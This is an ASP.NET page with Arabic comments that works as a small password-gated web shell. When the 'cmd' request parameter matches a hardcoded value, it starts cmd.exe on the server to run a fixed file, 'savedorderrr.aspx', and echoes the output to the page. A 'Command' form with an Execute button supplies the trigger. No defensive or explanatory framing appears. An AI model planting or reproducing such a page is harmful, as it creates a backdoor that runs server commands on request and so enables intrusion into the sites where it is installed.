<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        if (Request["cmd"] != null)
        {
            string command = Request["cmd"];
            
            // تحقق من أن القيمة المدخلة هي "28112016"
            if (command == "28112016")
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "cmd.exe";
                psi.Arguments = "/c savedorderrr.aspx";  // قم بتنفيذ الملف المحدد
                psi.RedirectStandardOutput = true;
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;

                Process process = Process.Start(psi);
                string output = process.StandardOutput.ReadToEnd();
                Response.Write("<pre>" + output + "</pre>");
            }
            else
            {
                // إذا لم تكن الكلمة المدخلة "28112016"، لا تفعل شيئًا (الصفحة تبقى بيضاء)
                Response.Write("<pre>Unauthorized access</pre>");
            }
        }
    }
</script>

<html>
<body>
    <form method="get">
        Command: <input type="text" name="cmd" />
        <input type="submit" value="Execute" />
    </form>
</body>
</html>
